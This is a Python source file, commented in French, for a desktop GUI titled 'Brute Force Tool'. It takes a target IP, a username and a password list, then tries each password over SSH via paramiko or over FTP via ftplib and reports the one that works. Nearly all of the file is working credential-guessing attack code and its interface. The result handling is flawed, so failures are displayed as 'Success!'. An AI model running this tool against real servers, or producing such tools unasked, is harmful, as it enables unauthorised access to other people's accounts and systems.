import tkinter as tk
import customtkinter as ctk
from paramiko import SSHClient, AutoAddPolicy
from ftplib import FTP

# Configurer customtkinter
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

# Fonction de brute force SSH
# Ajout à bruteforcessh.py

# Modifier les fonctions brute_force_ssh et brute_force_ftp pour retourner les détails de l'opération
def brute_force_ssh(ip, username, password_list):
    client = SSHClient()
    client.set_missing_host_key_policy(AutoAddPolicy())
    
    for password in password_list:
        try:
            client.connect(ip, username=username, password=password)
            return f"Success with password: {password}"
        except:
            continue
    return "Failed to find the password."

def brute_force_ftp(ip, username, password_list):
    for password in password_list:
        try:
            ftp = FTP(ip)
            ftp.login(user=username, passwd=password)
            ftp.quit()
            return f"Success with password: {password}"
        except:
            continue
    return "Failed to find the password."


# Fonction de traitement
def start_brute_force():
    ip = entry_ip.get()
    username = entry_username.get()
    passwords = text_passwords.get("1.0", tk.END).split()
    
    if option.get() == "SSH":
        result = brute_force_ssh(ip, username, passwords)
    else:
        result = brute_force_ftp(ip, username, passwords)
    
    if result:
        result_label.configure(text=f"Success! Password: {result}")
    else:
        result_label.configure(text="Failed to find the password.")

# Configuration de l'interface graphique
app = ctk.CTk()
app.geometry("500x500")
app.title("Brute Force Tool")

frame = ctk.CTkFrame(master=app)
frame.pack(pady=20, padx=20, fill="both", expand=True)

label_ip = ctk.CTkLabel(master=frame, text="Target IP:")
label_ip.pack(pady=5)
entry_ip = ctk.CTkEntry(master=frame)
entry_ip.pack(pady=5)

label_username = ctk.CTkLabel(master=frame, text="Username:")
label_username.pack(pady=5)
entry_username = ctk.CTkEntry(master=frame)
entry_username.pack(pady=5)

label_passwords = ctk.CTkLabel(master=frame, text="Password List:")
label_passwords.pack(pady=5)
text_passwords = ctk.CTkTextbox(master=frame, height=100)
text_passwords.pack(pady=5)

option = ctk.CTkOptionMenu(master=frame, values=["SSH", "FTP"])
option.pack(pady=5)

button_start = ctk.CTkButton(master=frame, text="Start Brute Force", command=start_brute_force)
button_start.pack(pady=20)

result_label = ctk.CTkLabel(master=frame, text="")
result_label.pack(pady=5)

app.mainloop()
